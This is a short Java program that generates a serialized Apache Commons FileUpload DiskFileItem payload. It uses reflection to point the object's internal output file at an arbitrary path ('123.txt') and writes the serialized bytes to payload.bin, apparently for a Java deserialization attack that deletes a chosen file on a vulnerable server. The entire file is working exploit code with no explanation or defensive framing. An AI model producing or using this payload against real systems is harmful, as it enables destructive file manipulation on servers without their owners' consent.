import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.FileUtils;


public class CreatePayloadDeleteFile {

	public static void main(String[] args) throws Exception {
		DiskFileItem f = new DiskFileItem("", "", false, "", 1, null);
		OutputStream dfos = f.getOutputStream();
		dfos.write(new byte[10]);
		f.delete();

		Field fFile = dfos.getClass().getDeclaredField("outputFile");
		fFile.setAccessible(true);
		fFile.set(dfos, new File("123.txt"));

		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		ObjectOutputStream out = new ObjectOutputStream(bos);
		out.writeObject(f);
		out.close();
		byte[] data = bos.toByteArray();
		FileUtils.writeByteArrayToFile(new File("payload.bin"), data);
	}
}
